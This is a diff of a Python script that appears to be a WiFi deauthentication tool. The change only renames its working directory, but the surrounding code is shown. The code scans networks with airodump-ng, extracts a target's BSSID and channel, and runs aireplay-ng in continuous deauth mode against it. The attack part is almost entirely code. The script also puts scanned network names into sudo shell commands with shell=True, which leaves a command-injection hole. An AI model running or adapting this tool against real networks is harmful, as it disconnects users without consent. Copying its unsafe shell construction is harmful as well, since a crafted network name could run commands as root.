@@ -26,7 +26,7 @@ blue = "\033[1;34m"
 
 def deleteF():
 
-    subprocess.run( "sudo rm -rf ./wifi_-96-_DeAuPs/wifiBssid.py ./wifi_-96-_DeAuPs/wifiChannel.py ./wifi_-96-_DeAuPs/wifiInterF.txt ./wifi_-96-_DeAuPs/essidColt.py ./wifi_-96-_DeAuPs/wifiChnelSts.py", shell = True, check = True )
+    subprocess.run( "sudo rm -rf ./wifi_-rble1-_DeAuPs/wifiBssid.py ./wifi_-rble1-_DeAuPs/wifiChannel.py ./wifi_-rble1-_DeAuPs/wifiInterF.txt ./wifi_-rble1-_DeAuPs/essidColt.py ./wifi_-rble1-_DeAuPs/wifiChnelSts.py", shell = True, check = True )
 
 
 
@@ -94,7 +94,7 @@ def kiddDeAuth( BSSID, interface, ESSID ):
 
         print( f"\n\n{ red }Program is roasting the { ESSID } fish!\n\n" )
 
-        chkErrF = open( "./wifi_-96-_DeAuPs/wifiChnelSts.py", "w" )
+        chkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "w" )
 
         cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]
 
@@ -110,7 +110,7 @@ def kiddDeAuth( BSSID, interface, ESSID ):
 
         try:
 
-            radChkErrF = open( "./wifi_-96-_DeAuPs/wifiChnelSts.py", "r" )
+            radChkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "r" )
 
             txt = radChkErrF.read().strip()
 
@@ -172,11 +172,11 @@ def kiddDeAuth( BSSID, interface, ESSID ):
 
 def air( IF, rstEssid = None ):
 
-    delMkDirCmd = "rm -rf wifi_-96-_DeAuPs"
+    delMkDirCmd = "rm -rf wifi_-rble1-_DeAuPs"
 
     subprocess.run( delMkDirCmd, shell = True, check = True )
 
-    mkDirCmd = "sudo mkdir wifi_-96-_DeAuPs"
+    mkDirCmd = "sudo mkdir wifi_-rble1-_DeAuPs"
 
     subprocess.run( mkDirCmd, shell = True, check = True )
 
@@ -188,7 +188,7 @@ def air( IF, rstEssid = None ):
 
     dic = {}
 
-    f = open( "./wifi_-96-_DeAuPs/wifiInterF.txt", "w" )
+    f = open( "./wifi_-rble1-_DeAuPs/wifiInterF.txt", "w" )
 
     cmd = [ "sudo", "airodump-ng", "-i", IF ]
 
@@ -204,13 +204,13 @@ def air( IF, rstEssid = None ):
 
     if rstEssid == None:
 
-        essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' ./wifi_-96-_DeAuPs/wifiInterF.txt | sort -u > ./wifi_-96-_DeAuPs/essidColt.py"
+        essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | sort -u > ./wifi_-rble1-_DeAuPs/essidColt.py"
 
         subprocess.run( essidCmd, shell = True, check = True )
 
         time.sleep( 0.2 )
 
-        with open( "./wifi_-96-_DeAuPs/essidColt.py", "r" ) as f:
+        with open( "./wifi_-rble1-_DeAuPs/essidColt.py", "r" ) as f:
 
             for readL in f:
 
@@ -246,9 +246,9 @@ def air( IF, rstEssid = None ):
 
     ESSID = dic[ "ESSID" ]
 
-    cmd1 = "sudo grep -i '%s' ./wifi_-96-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $2 }' > ./wifi_-96-_DeAuPs/wifiBssid.py" % ESSID
+    cmd1 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $2 }' > ./wifi_-rble1-_DeAuPs/wifiBssid.py" % ESSID
 
-    cmd2 = "sudo grep -i '%s' ./wifi_-96-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $7 }' > ./wifi_-96-_DeAuPs/wifiChannel.py" % ESSID
+    cmd2 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $7 }' > ./wifi_-rble1-_DeAuPs/wifiChannel.py" % ESSID
 
     subprocess.run( cmd1, shell = True, check = True )
 
@@ -260,9 +260,9 @@ def air( IF, rstEssid = None ):
 
     try:
 
-        bFile = open( "./wifi_-96-_DeAuPs/wifiBssid.py", "r" )
+        bFile = open( "./wifi_-rble1-_DeAuPs/wifiBssid.py", "r" )
 
-        cFile = open( "./wifi_-96-_DeAuPs/wifiChannel.py", "r" )
+        cFile = open( "./wifi_-rble1-_DeAuPs/wifiChannel.py", "r" )
 
         bssid = bFile.read().strip()
 
